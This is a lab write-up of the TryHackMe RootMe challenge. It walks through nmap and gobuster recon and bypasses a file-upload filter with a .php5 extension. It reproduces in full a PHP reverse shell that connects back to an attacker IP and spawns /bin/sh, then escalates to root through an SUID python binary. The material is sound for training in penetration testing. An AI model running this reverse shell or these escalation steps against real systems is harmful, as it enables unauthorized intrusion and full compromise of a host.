# TryHackMe: RootMe

**Challenge Name:** RootMe
**Platform:** TryHackMe
**Category:** Web Exploitation
**Difficulty:** Easy
**Date Completed:** 03/26/2025

## 1. Overview

RootMe is a beginner-friendly CTF challenge on TryHackMe that focuses on basic penetration testing skills. The goals are:
- Perform reconnaissance to identify open ports and services
- Find and exploit a file upload vulnerability to gain initial access
- Privilege escalation through SUID misconfiguration
- Retrieve both user and root flags
## 2. Tools and Techniques

- **Network Scanning**: Nmap
- **Directory Brute-forcing**: Gobuster
- **Web Exploitation**: File upload vulnerability
- **Reverse Shell**: PHP reverse shell
- **Privilege Escalation**: SUID misconfiguration (Python)
- **Other Tools**: Netcat for listener
## 3. Solution

I like to start by pinging the IP of the target machine:
![ss1](https://github.com/user-attachments/assets/11a7dfdb-aa55-4bc0-a728-eefd465eb942)

Then, I visited the IP in my web browser to see what we were working with

![ss2](https://github.com/user-attachments/assets/b9c79efc-aa50-48cb-b7d4-66be9756a008)

It looks pretty unassuming, so I will move on to an nmap scan
### Recon

First, I started with a basic nmap scan to identify open ports/services:

```bash
nmap -sC -sV 10.10.95.41
```

![ss3](https://github.com/user-attachments/assets/46939c15-7bd1-45fc-8d02-5be15cdd0e08)

The scan revealed two open ports:
- Port 22: SSH service
- Port 80: Apache httpd 2.4.29

### Web Enumeration

I used Gobuster to find hidden directories:

```bash
gobuster dir -u http://10.10.95.41/ -w /usr/share/seclists/Discovery/Web-Content/big.txt
```

![ss4](https://github.com/user-attachments/assets/c5a14b58-1260-42fa-a488-3fb8cef3f13c)

Using a large wordlist like this is maybe overkill, but I like to use this one so I don't miss anything.

The interesting directory found was `/panel`, which contained a file upload functionality:

![ss5](https://github.com/user-attachments/assets/a19d0ed2-3fb1-4409-8b65-fdd66d896549)

### Exploiting File Upload

The next task we are asked to accomplish is to get a reverse shell and retrieve the user flag.

After several attempts with different file extensions:

1. `shell.php` - Blocked
2. `shell.php.jpg` - Uploaded but didn't execute
3. `shell.php1` - Uploaded but didn't execute
4. `shell.php5` - <font color="#c00000">Successfully uploaded and executed</font>

![ss6](https://github.com/user-attachments/assets/69b4a840-9e47-42b6-acc3-fb714c30831a)

shell.php5 worked using a PHP reverse shell from pentestmonkey (modified with my IP and port):

![ss7](https://github.com/user-attachments/assets/f59f531b-3f9e-4116-a4bd-1dcc4dd3cdeb)

The code can be found here:
https://github.com/pentestmonkey/php-reverse-shell

```php
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.13.82.134';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
```

I uploaded the file with this code and set a listener using netcat:

```bash
nc -lvnp 1234
```

![ss8](https://github.com/user-attachments/assets/fca299bc-fa93-4e26-ae37-fd00b8fa3c22)

I then visited the file url (you can get there by clicking on the veja! link on the page or going to the /uploads directory).

This prompted a response from the listener:

![ss9](https://github.com/user-attachments/assets/6d279566-aa04-496d-882a-2ca09931308c)

Now we have access to a shell.
I started out by using the `whoami` command to get an idea

![ss10](https://github.com/user-attachments/assets/069170c9-161e-4d9d-aa20-9834fdfed5ae)

We are www-data

### Finding the User Flag

Locate the user flag:

```bash
find / -name user.txt 2>/dev/null
cat /var/www/user.txt
```

![s11](https://github.com/user-attachments/assets/57c27553-06e8-44eb-9202-22499cf26afb)
(I didn't add 2>/dev/null, but you can see the /var/www/user.txt in the screenshot does not have denied permissions)

![s12](https://github.com/user-attachments/assets/da4fbe14-f8ea-4fbe-8337-febf400032c5)
(You can see here user.txt, just cat it out for the user flag)

### Privilege Escalation and Root Flag

Checking for SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

![s13](https://github.com/user-attachments/assets/88e0f114-df59-41df-b09a-5aa4cc0e7196)

![s14](https://github.com/user-attachments/assets/c002b747-a3a4-4fa7-87ce-29e4a9c27509)

Noticed `/usr/bin/python` stuck out, check the permissions and it had SUID permissions:

![s15](https://github.com/user-attachments/assets/de0a9c47-303b-495d-96ec-6d7f670484b3)

Lets use this to spawn a root shell:

```bash
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

The way this command works is like so:
1. Start a Python process.
2. Within that Python process, import the os module.
3. Use os.execl() to replace the Python process with a new /bin/sh process.
4. It passes the -p flag to /bin/sh.

The -p flag is often used in setuid or setgid programs. When a program with the setuid bit set is executed, it runs with the privileges of the file owner, not the user who executed it. Similarly, setgid programs run with the privileges of the file's group.

By using -p, the spawned shell will retain the elevated privileges of the process that executed the Python script (if it had any, like being run via sudo or if the Python script itself had setuid/setgid permissions).

(Basically spawning a privileged shell)

![s16](https://github.com/user-attachments/assets/457b8600-292e-4b3b-94a4-7325bed7f183)

Now we can use `whoami` to see we are now root

now we can just:

```bash
find / -name root.txt
cat /root/root.txt
```

Now we have the root flag

![s17](https://github.com/user-attachments/assets/d5ae72f8-22df-4c1e-b9d3-1a725fd1e78c)

## 4. Takeaways

1. **File Upload Bypass**: Testing various file extensions can bypass weak filters
2. **SUID Misconfigurations**: Always check for unusual SUID binaries
3. **Python Privilege Escalation**: Python with SUID is a common privilege escalation vector
4. **Persistence Pays Off**: Multiple attempts with different approaches led to success
5. **Comprehensive Enumeration**: Using large wordlists in Gobuster helped find hidden directories

